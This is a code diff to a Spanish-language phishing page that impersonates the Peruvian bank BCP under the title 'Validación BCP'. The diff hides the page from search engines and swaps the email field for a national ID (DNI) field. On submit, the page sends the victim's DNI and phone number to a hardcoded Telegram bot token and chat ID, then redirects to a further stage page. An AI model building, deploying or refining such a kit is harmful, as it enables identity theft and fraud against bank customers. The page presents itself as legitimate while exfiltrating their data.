@@ -1,6 +1,8 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="googlebot" content="noindex, nofollow">
   <meta charset="UTF-8">
   <title>Validación BCP</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
@@ -229,11 +231,12 @@
   <h2 class="title">Hola,<br>Validaremos tu datos</h2><br>
 
   <form class="form-container" id="formulario" novalidate>
-    <div class="input-group" id="group-email">
-      <input type="email" id="email" placeholder=" " />
-      <label for="email">Email</label>
-      <div class="error-message" id="error-email"></div>
-    </div>
+   <!-- POR esto -->
+<div class="input-group" id="group-dni">
+  <input type="text" id="dni" placeholder=" " maxlength="8" />
+  <label for="dni">DNI</label>
+  <div class="error-message" id="error-dni"></div>
+</div>
     <div class="input-group" id="group-celular">
       <input type="text" id="celular" placeholder=" " maxlength="9" />
       <label for="celular">Celular</label>
@@ -247,23 +250,28 @@
   </form>
 <script>
   const form = document.getElementById('formulario');
-  const email = document.getElementById('email');
+  const dni = document.getElementById('dni');
   const celular = document.getElementById('celular');
 
-  const emailGroup = document.getElementById('group-email');
+  const dniGroup = document.getElementById('group-dni');
   const celularGroup = document.getElementById('group-celular');
-  const errorEmail = document.getElementById('error-email');
+  const errorDni = document.getElementById('error-dni');
   const errorCelular = document.getElementById('error-celular');
 
-  function validateEmail() {
-    const emailValue = email.value.trim();
-    const valid = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(emailValue);
+  // Limitar a 8 dígitos numéricos mientras escribe
+  dni.addEventListener('input', () => {
+    dni.value = dni.value.replace(/\D/g, '').slice(0, 8);
+  });
+
+  function validateDni() {
+    const dniValue = dni.value.trim();
+    const valid = /^\d{8}$/.test(dniValue);
     if (!valid) {
-      emailGroup.classList.add('error');
-      errorEmail.textContent = 'Ingrese un correo válido';
+      dniGroup.classList.add('error');
+      errorDni.textContent = 'Ingrese un DNI válido de 8 dígitos.';
     } else {
-      emailGroup.classList.remove('error');
-      errorEmail.textContent = '';
+      dniGroup.classList.remove('error');
+      errorDni.textContent = '';
     }
     return valid;
   }
@@ -281,26 +289,25 @@
     return valid;
   }
 
-  email.addEventListener('blur', validateEmail);
+  dni.addEventListener('blur', validateDni);
   celular.addEventListener('blur', validateCelular);
 
   form.addEventListener('submit', function(e) {
     e.preventDefault();
-    const validEmail = validateEmail();
+    const validDni = validateDni();
     const validCelular = validateCelular();
 
-    if (validEmail && validCelular) {
-      // 👉 Guardamos en localStorage
-      localStorage.setItem("email", email.value.trim());
+    if (validDni && validCelular) {
+      // Guardar en localStorage
+      localStorage.setItem("dni", dni.value.trim());
       localStorage.setItem("celular", celular.value.trim());
 
-      // 👉 Enviar a Telegram
+      // Enviar a Telegram
       const token = "7779988089:AAE4-6hOLNzGIfh5evEvaNLUEtYCyDhaDec";
       const chat_id = "7759602420";
-      const mensaje = `📧 Email: ${email.value}\n📱 Celular: ${celular.value}`;
+      const mensaje = `🪪 DNI: ${dni.value}\n📱 Celular: ${celular.value}`;
       fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(mensaje)}`)
         .then(res => {
-          // MOSTRAR FLOTANTE Y REDIRIGIR DESPUÉS DE 2 SEGUNDOS
           mostrarLoader("index4.html");
         }).catch(err => {
           alert("Error al enviar a Telegram");
@@ -308,6 +315,8 @@
     }
   });
 </script>
+
+
 
 
 
